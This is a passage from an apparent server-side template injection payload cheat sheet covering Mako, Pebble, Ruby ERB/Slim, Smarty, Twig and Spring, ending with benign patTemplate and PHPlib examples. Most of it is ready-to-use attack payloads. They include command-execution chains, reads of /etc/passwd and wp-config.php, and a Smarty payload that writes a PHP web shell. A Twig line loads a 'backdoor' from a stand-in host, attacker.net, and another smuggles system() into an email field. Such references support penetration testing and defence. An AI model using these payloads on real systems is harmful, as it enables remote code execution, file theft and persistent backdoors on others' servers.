</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>runtime<span style="color:#f92672">.</span>exceptions<span style="color:#f92672">.</span>compat<span style="color:#f92672">.</span>inspect<span style="color:#f92672">.</span>linecache<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>attr<span style="color:#f92672">.</span>_NSAttr__parent<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>runtime<span style="color:#f92672">.</span>exceptions<span style="color:#f92672">.</span>util<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>context<span style="color:#f92672">.</span>_with_template<span style="color:#f92672">.</span>_mmarker<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>runtime<span style="color:#f92672">.</span>util<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>context<span style="color:#f92672">.</span>_with_template<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>filters<span style="color:#f92672">.</span>compat<span style="color:#f92672">.</span>inspect<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>context<span style="color:#f92672">.</span>_with_template<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>runtime<span style="color:#f92672">.</span>compat<span style="color:#f92672">.</span>inspect<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>context<span style="color:#f92672">.</span>_with_template<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>runtime<span style="color:#f92672">.</span>exceptions<span style="color:#f92672">.</span>util<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>template<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>runtime<span style="color:#f92672">.</span>exceptions<span style="color:#f92672">.</span>traceback<span style="color:#f92672">.</span>linecache<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
</span></span></code></pre></div><p>PoC :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> print(Template(<span style="color:#e6db74">&#34;$</span><span style="color:#e6db74">{self.module.cache.util.os}</span><span style="color:#e6db74">&#34;</span>)<span style="color:#f92672">.</span>render())
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span>module <span style="color:#e6db74">&#39;os&#39;</span> <span style="color:#f92672">from</span> <span style="color:#e6db74">&#39;/usr/local/lib/python3.10/os.py&#39;</span><span style="color:#f92672">&gt;</span>
</span></span></code></pre></div><p>Source <a href="https://twitter.com/podalirius_">@podalirius_</a> : <a href="https://podalirius.net/en/articles/python-context-free-payloads-in-mako-templates/">https://podalirius.net/en/articles/python-context-free-payloads-in-mako-templates/</a></p>
<hr>
<h2 id="pebble">
  Pebble
  <a class="anchor" href="#pebble">#</a>
</h2>
<p><a href="https://pebbletemplates.io/">Official website</a></p>
<blockquote>
<p>Pebble is a Java templating engine inspired by <a href="./#twig">Twig</a> and similar to the Python <a href="./#jinja2">Jinja</a> Template Engine syntax. It features templates inheritance and easy-to-read syntax, ships with built-in autoescaping for security, and includes integrated support for internationalization.</p>
</blockquote>
<h3 id="pebble---basic-injection">
  Pebble - Basic injection
  <a class="anchor" href="#pebble---basic-injection">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">{{</span> someString<span style="color:#f92672">.</span><span style="color:#a6e22e">toUPPERCASE</span><span style="color:#f92672">()</span> <span style="color:#f92672">}}</span>
</span></span></code></pre></div><h3 id="pebble---code-execution">
  Pebble - Code execution
  <a class="anchor" href="#pebble---code-execution">#</a>
</h3>
<p>Old version of Pebble ( &lt; version 3.0.9): <code>{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la') }}</code>.</p>
<p>New version of Pebble :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">{%</span> set cmd <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">&#39;</span>id<span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#f92672">%}</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">{%</span> set bytes <span style="color:#f92672">=</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span><span style="color:#f92672">).</span><span style="color:#a6e22e">TYPE</span>
</span></span><span style="display:flex;"><span>     <span style="color:#f92672">.</span><span style="color:#a6e22e">forName</span><span style="color:#f92672">(</span><span style="color:#960050;background-color:#1e0010">&#39;</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Runtime</span><span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>     <span style="color:#f92672">.</span><span style="color:#a6e22e">methods</span><span style="color:#f92672">[</span><span style="color:#ae81ff">6</span><span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>     <span style="color:#f92672">.</span><span style="color:#a6e22e">invoke</span><span style="color:#f92672">(</span><span style="color:#66d9ef">null</span><span style="color:#f92672">,</span><span style="color:#66d9ef">null</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>     <span style="color:#f92672">.</span><span style="color:#a6e22e">exec</span><span style="color:#f92672">(</span>cmd<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>     <span style="color:#f92672">.</span><span style="color:#a6e22e">inputStream</span>
</span></span><span style="display:flex;"><span>     <span style="color:#f92672">.</span><span style="color:#a6e22e">readAllBytes</span><span style="color:#f92672">()</span> <span style="color:#f92672">%}</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">{{</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span><span style="color:#f92672">).</span><span style="color:#a6e22e">TYPE</span>
</span></span><span style="display:flex;"><span>     <span style="color:#f92672">.</span><span style="color:#a6e22e">forName</span><span style="color:#f92672">(</span><span style="color:#960050;background-color:#1e0010">&#39;</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">String</span><span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>     <span style="color:#f92672">.</span><span style="color:#a6e22e">constructors</span><span style="color:#f92672">[</span><span style="color:#ae81ff">0</span><span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>     <span style="color:#f92672">.</span><span style="color:#a6e22e">newInstance</span><span style="color:#f92672">(([</span>bytes<span style="color:#f92672">]).</span><span style="color:#a6e22e">toArray</span><span style="color:#f92672">())</span> <span style="color:#f92672">}}</span>
</span></span></code></pre></div><hr>
<h2 id="ruby">
  Ruby
  <a class="anchor" href="#ruby">#</a>
</h2>
<h3 id="ruby---basic-injections">
  Ruby - Basic injections
  <a class="anchor" href="#ruby---basic-injections">#</a>
</h3>
<p>ERB:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#f92672">&lt;%=</span> <span style="color:#ae81ff">7</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">7</span> <span style="color:#f92672">%&gt;</span>
</span></span></code></pre></div><h3 id="ruby---retrieve-etcpasswd">
  Ruby - Retrieve /etc/passwd
  <a class="anchor" href="#ruby---retrieve-etcpasswd">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#f92672">&lt;%=</span> <span style="color:#66d9ef">File</span><span style="color:#f92672">.</span>open(<span style="color:#e6db74">&#39;/etc/passwd&#39;</span>)<span style="color:#f92672">.</span>read <span style="color:#f92672">%&gt;</span>
</span></span></code></pre></div><h3 id="ruby---list-files-and-directories">
  Ruby - List files and directories
  <a class="anchor" href="#ruby---list-files-and-directories">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#f92672">&lt;%=</span> <span style="color:#66d9ef">Dir</span><span style="color:#f92672">.</span>entries(<span style="color:#e6db74">&#39;/&#39;</span>) <span style="color:#f92672">%&gt;</span>
</span></span></code></pre></div><h3 id="ruby---code-execution">
  Ruby - Code execution
  <a class="anchor" href="#ruby---code-execution">#</a>
</h3>
<p>Execute code using SSTI for ERB engine.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#e6db74">%= system(&#39;cat /etc/passwd&#39;) %&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;%=</span> <span style="color:#e6db74">`ls /`</span> <span style="color:#e6db74">%&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;%= IO.popen(&#39;ls /&#39;).readlines()  %&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#e6db74">% require </span> <span style="color:#e6db74">&#39;open3&#39;</span> <span style="color:#e6db74">%&gt;&lt;% @a,@b,@c,@d=Open3.popen3(&#39;whoami&#39;) %&gt;</span><span style="color:#f92672">&lt;</span><span style="color:#e6db74">%= @b.readline()%&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;% require &#39;open4&#39; %&gt;&lt;% @a,@b,@c,@d=</span><span style="color:#66d9ef">Open4</span><span style="color:#f92672">.</span>popen4(<span style="color:#e6db74">&#39;whoami&#39;</span>) <span style="color:#e6db74">%&gt;&lt;%= @c.readline()%&gt;</span>
</span></span></code></pre></div><p>Execute code using SSTI for Slim engine.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e">#{ %x|env| }</span>
</span></span></code></pre></div><hr>
<h2 id="smarty">
  Smarty
  <a class="anchor" href="#smarty">#</a>
</h2>
<p><a href="https://www.smarty.net/docs/en/">Official website</a></p>
<blockquote>
<p>Smarty is a template engine for PHP.</p>
</blockquote>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{<span style="color:#960050;background-color:#1e0010">$</span>smarty<span style="color:#f92672">.</span>version}
</span></span><span style="display:flex;"><span>{php}echo <span style="color:#960050;background-color:#1e0010">`</span>id<span style="color:#960050;background-color:#1e0010">`</span>;{<span style="color:#f92672">/</span>php} <span style="color:#f92672">//</span>deprecated <span style="color:#f92672">in</span> smarty v3
</span></span><span style="display:flex;"><span>{Smarty_Internal_Write_File::writeFile(<span style="color:#960050;background-color:#1e0010">$</span>SCRIPT_NAME,<span style="color:#e6db74">&#34;&lt;?php passthru($_GET[&#39;cmd&#39;]); ?&gt;&#34;</span>,self::clearConfig())}
</span></span><span style="display:flex;"><span>{system(<span style="color:#e6db74">&#39;ls&#39;</span>)} <span style="color:#f92672">//</span> compatible v3
</span></span><span style="display:flex;"><span>{system(<span style="color:#e6db74">&#39;cat index.php&#39;</span>)} <span style="color:#f92672">//</span> compatible v3
</span></span></code></pre></div><hr>
<h2 id="twig">
  Twig
  <a class="anchor" href="#twig">#</a>
</h2>
<p><a href="https://twig.symfony.com/">Official website</a></p>
<blockquote>
<p>Twig is a modern template engine for PHP.</p>
</blockquote>
<h3 id="twig---basic-injection">
  Twig - Basic injection
  <a class="anchor" href="#twig---basic-injection">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{<span style="color:#ae81ff">7</span><span style="color:#f92672">*</span><span style="color:#ae81ff">7</span>}}
</span></span><span style="display:flex;"><span>{{<span style="color:#ae81ff">7</span><span style="color:#f92672">*</span><span style="color:#e6db74">&#39;7&#39;</span>}} would result <span style="color:#f92672">in</span> <span style="color:#ae81ff">49</span>
</span></span><span style="display:flex;"><span>{{dump(app)}}
</span></span><span style="display:flex;"><span>{{dump(_context)}}
</span></span><span style="display:flex;"><span>{{app<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>server<span style="color:#f92672">.</span>all<span style="color:#f92672">|</span>join(<span style="color:#e6db74">&#39;,&#39;</span>)}}
</span></span></code></pre></div><h3 id="twig---template-format">
  Twig - Template format
  <a class="anchor" href="#twig---template-format">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>output <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">$</span>twig <span style="color:#f92672">&gt;</span> render (
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#39;Dear&#39;</span> <span style="color:#f92672">.</span> <span style="color:#960050;background-color:#1e0010">$</span>_GET[<span style="color:#e6db74">&#39;custom_greeting&#39;</span>],
</span></span><span style="display:flex;"><span>  array(<span style="color:#e6db74">&#34;first_name&#34;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#960050;background-color:#1e0010">$</span>user<span style="color:#f92672">.</span>first_name)
</span></span><span style="display:flex;"><span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>output <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">$</span>twig <span style="color:#f92672">&gt;</span> render (
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;Dear </span><span style="color:#e6db74">{first_name}</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>  array(<span style="color:#e6db74">&#34;first_name&#34;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#960050;background-color:#1e0010">$</span>user<span style="color:#f92672">.</span>first_name)
</span></span><span style="display:flex;"><span>);
</span></span></code></pre></div><h3 id="twig---arbitrary-file-reading">
  Twig - Arbitrary File Reading
  <a class="anchor" href="#twig---arbitrary-file-reading">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#e6db74">&#34;{{&#39;/etc/passwd&#39;|file_excerpt(1,30)}}&#34;</span><span style="color:#f92672">@</span>
</span></span><span style="display:flex;"><span>{{include(<span style="color:#e6db74">&#34;wp-config.php&#34;</span>)}}
</span></span></code></pre></div><h3 id="twig---code-execution">
  Twig - Code execution
  <a class="anchor" href="#twig---code-execution">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{self}}
</span></span><span style="display:flex;"><span>{{_self<span style="color:#f92672">.</span>env<span style="color:#f92672">.</span>setCache(<span style="color:#e6db74">&#34;ftp://attacker.net:2121&#34;</span>)}}{{_self<span style="color:#f92672">.</span>env<span style="color:#f92672">.</span>loadTemplate(<span style="color:#e6db74">&#34;backdoor&#34;</span>)}}
</span></span><span style="display:flex;"><span>{{_self<span style="color:#f92672">.</span>env<span style="color:#f92672">.</span>registerUndefinedFilterCallback(<span style="color:#e6db74">&#34;exec&#34;</span>)}}{{_self<span style="color:#f92672">.</span>env<span style="color:#f92672">.</span>getFilter(<span style="color:#e6db74">&#34;id&#34;</span>)}}
</span></span><span style="display:flex;"><span>{{[<span style="color:#e6db74">&#39;id&#39;</span>]<span style="color:#f92672">|</span>filter(<span style="color:#e6db74">&#39;system&#39;</span>)}}
</span></span><span style="display:flex;"><span>{{[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">|</span>reduce(<span style="color:#e6db74">&#39;system&#39;</span>,<span style="color:#e6db74">&#39;id&#39;</span>)}}
</span></span><span style="display:flex;"><span>{{[<span style="color:#e6db74">&#39;id&#39;</span>]<span style="color:#f92672">|</span>map(<span style="color:#e6db74">&#39;system&#39;</span>)<span style="color:#f92672">|</span>join}}
</span></span><span style="display:flex;"><span>{{[<span style="color:#e6db74">&#39;id&#39;</span>,<span style="color:#ae81ff">1</span>]<span style="color:#f92672">|</span>sort(<span style="color:#e6db74">&#39;system&#39;</span>)<span style="color:#f92672">|</span>join}}
</span></span><span style="display:flex;"><span>{{[<span style="color:#e6db74">&#39;cat</span><span style="color:#ae81ff">\x20</span><span style="color:#e6db74">/etc/passwd&#39;</span>]<span style="color:#f92672">|</span>filter(<span style="color:#e6db74">&#39;system&#39;</span>)}}
</span></span><span style="display:flex;"><span>{{[<span style="color:#e6db74">&#39;cat$IFS/etc/passwd&#39;</span>]<span style="color:#f92672">|</span>filter(<span style="color:#e6db74">&#39;system&#39;</span>)}}
</span></span><span style="display:flex;"><span>{{[<span style="color:#e6db74">&#39;id&#39;</span>]<span style="color:#f92672">|</span>filter(<span style="color:#e6db74">&#39;passthru&#39;</span>)}}
</span></span><span style="display:flex;"><span>{{[<span style="color:#e6db74">&#39;id&#39;</span>]<span style="color:#f92672">|</span>map(<span style="color:#e6db74">&#39;passthru&#39;</span>)}}
</span></span></code></pre></div><p>Example injecting values to avoid using quotes for the filename (specify via OFFSET and LENGTH where the payload FILENAME is)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>FILENAME{<span style="color:#f92672">%</span> set var <span style="color:#f92672">=</span> dump(_context)[OFFSET:LENGTH] <span style="color:#f92672">%</span>} {{ include(var) }}
</span></span></code></pre></div><p>Example with an email passing FILTER_VALIDATE_EMAIL PHP.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>POST /subscribe<span style="color:#66d9ef">?</span><span style="color:#ae81ff">0</span>=cat+/etc/passwd HTTP/<span style="color:#ae81ff">1.1</span>
</span></span><span style="display:flex;"><span>email=<span style="color:#e6db74">&#34;{{app.request.query.filter(0,0,1024,{&#39;options&#39;:&#39;system&#39;})}}&#34;</span>@attacker.tld
</span></span></code></pre></div><hr>
<h2 id="java---velocity">
  Java - Velocity
  <a class="anchor" href="#java---velocity">#</a>
</h2>
<p><a href="https://velocity.apache.org/engine/1.7/user-guide.html">Official website</a></p>
<blockquote>
<p>Velocity is a Java-based template engine. It permits web page designers to reference methods defined in Java code.</p>
</blockquote>
<hr>
<h2 id="java---spring">
  Java - Spring
  <a class="anchor" href="#java---spring">#</a>
</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">*</span>{<span style="color:#ae81ff">7</span><span style="color:#f92672">*</span><span style="color:#ae81ff">7</span>}
</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>{T(org<span style="color:#f92672">.</span>apache<span style="color:#f92672">.</span>commons<span style="color:#f92672">.</span>io<span style="color:#f92672">.</span>IOUtils)<span style="color:#f92672">.</span>toString(T(java<span style="color:#f92672">.</span>lang<span style="color:#f92672">.</span>Runtime)<span style="color:#f92672">.</span>getRuntime()<span style="color:#f92672">.</span>exec(<span style="color:#e6db74">&#39;id&#39;</span>)<span style="color:#f92672">.</span>getInputStream())}
</span></span></code></pre></div><hr>
<h2 id="pattemplate">
  patTemplate
  <a class="anchor" href="#pattemplate">#</a>
</h2>
<blockquote>
<p><a href="https://github.com/wernerwa/pat-template">patTemplate</a> non-compiling PHP templating engine, that uses XML tags to divide a document into different parts</p>
</blockquote>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;patTemplate:tmpl</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;page&#34;</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>  This is the main page.
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;patTemplate:tmpl</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;foo&#34;</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>    It contains another template.
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;/patTemplate:tmpl&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;patTemplate:tmpl</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;hello&#34;</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>    Hello {NAME}.<span style="color:#f92672">&lt;br/&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;/patTemplate:tmpl&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/patTemplate:tmpl&gt;</span>
</span></span></code></pre></div><hr>
<h2 id="phplib-and-html_template_phplib">
  PHPlib and HTML_Template_PHPLIB
  <a class="anchor" href="#phplib-and-html_template_phplib">#</a>
</h2>
<p><a href="https://github.com/pear/HTML_Template_PHPLIB">HTML_Template_PHPLIB</a> is the same as PHPlib but ported to Pear.</p>
<p><code>authors.tpl</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
</span></span><span style="display:flex;"><span> &lt;<span style="color:#f92672">head</span>&gt;&lt;<span style="color:#f92672">title</span>&gt;{PAGE_TITLE}&lt;/<span style="color:#f92672">title</span>&gt;&lt;/<span style="color:#f92672">head</span>&gt;
</span></span><span style="display:flex;"><span> &lt;<span style="color:#f92672">body</span>&gt;
</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">table</span>&gt;
</span></span><span style="display:flex;"><span>   &lt;<span style="color:#f92672">caption</span>&gt;Authors&lt;/<span style="color:#f92672">caption</span>&gt;
</span></span><span style="display:flex;"><span>   &lt;<span style="color:#f92672">thead</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">tr</span>&gt;&lt;<span style="color:#f92672">th</span>&gt;Name&lt;/<span style="color:#f92672">th</span>&gt;&lt;<span style="color:#f92672">th</span>&gt;Email&lt;/<span style="color:#f92672">th</span>&gt;&lt;/<span style="color:#f92672">tr</span>&gt;
</span></span><span style="display:flex;"><span>   &lt;/<span style="color:#f92672">thead</span>&gt;
</span></span><span style="display:flex;"><span>   &lt;<span style="color:#f92672">tfoot</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">tr</span>&gt;&lt;<span style="color:#f92672">td</span> <span style="color:#a6e22e">colspan</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;2&#34;</span>&gt;{NUM_AUTHORS}&lt;/<span style="color:#f92672">td</span>&gt;&lt;/<span style="color:#f92672">tr</span>&gt;
</span></span><span style="display:flex;"><span>   &lt;/<span style="color:#f92672">tfoot</span>&gt;
</span></span><span style="display:flex;"><span>   &lt;<span style="color:#f92672">tbody</span>&gt;
</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!-- BEGIN authorline --&gt;</span>
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">tr</span>&gt;&lt;<span style="color:#f92672">td</span>&gt;{AUTHOR_NAME}&lt;/<span style="color:#f92672">td</span>&gt;&lt;<span style="color:#f92672">td</span>&gt;{AUTHOR_EMAIL}&lt;/<span style="color:#f92672">td</span>&gt;&lt;/<span style="color:#f92672">tr</span>&gt;
</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!-- END authorline --&gt;</span>
</span></span><span style="display:flex;"><span>   &lt;/<span style="color:#f92672">tbody</span>&gt;
</span></span><span style="display:flex;"><span>  &lt;/<span style="color:#f92672">table</span>&gt;
</span></span><span style="display:flex;"><span> &lt;/<span style="color:#f92672">body</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
</span></span></code></pre></div><p><code>authors.php</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">//we want to display this author list
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$authors <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;Christian Weiske&#39;</span>  <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;cweiske@php.net&#39;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;Bjoern Schotte&#39;</span>     <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;schotte@mayflower.de&#39;</span>
</span></span><span style="display:flex;"><span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">require_once</span> <span style="color:#e6db74">&#39;HTML/Template/PHPLIB.php&#39;</span>;
</span></span><span style="display:flex;"><span><span style="color:#75715e">//create template object
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$t <span style="color:#f92672">=&amp;</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">HTML_Template_PHPLIB</span>(<span style="color:#a6e22e">dirname</span>(<span style="color:#66d9ef">__FILE__</span>), <span style="color:#e6db74">&#39;keep&#39;</span>);
</span></span><span style="display:flex;"><span><span style="color:#75715e">//load file
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$t<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">setFile</span>(<span style="color:#e6db74">&#39;authors&#39;</span>, <span style="color:#e6db74">&#39;authors.tpl&#39;</span>);
</span></span><span style="display:flex;"><span><span style="color:#75715e">//set block
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$t<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">setBlock</span>(<span style="color:#e6db74">&#39;authors&#39;</span>, <span style="color:#e6db74">&#39;authorline&#39;</span>, <span style="color:#e6db74">&#39;authorline_ref&#39;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">//set some variables
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$t<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">setVar</span>(<span style="color:#e6db74">&#39;NUM_AUTHORS&#39;</span>, <span style="color:#a6e22e">count</span>($authors));
</span></span><span style="display:flex;"><span>$t<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">setVar</span>(<span style="color:#e6db74">&#39;PAGE_TITLE&#39;</span>, <span style="color:#e6db74">&#39;Code authors as of &#39;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">date</span>(<span style="color:#e6db74">&#39;Y-m-d&#39;</span>));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">//display the authors
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">foreach</span> ($authors <span style="color:#66d9ef">as</span> $name <span style="color:#f92672">=&gt;</span> $email) {
</span></span><span style="display:flex;"><span>    $t<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">setVar</span>(<span style="color:#e6db74">&#39;AUTHOR_NAME&#39;</span>, $name);
</span></span><span style="display:flex;"><span>    $t<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">setVar</span>(<span style="color:#e6db74">&#39;AUTHOR_EMAIL&#39;</span>, $email);
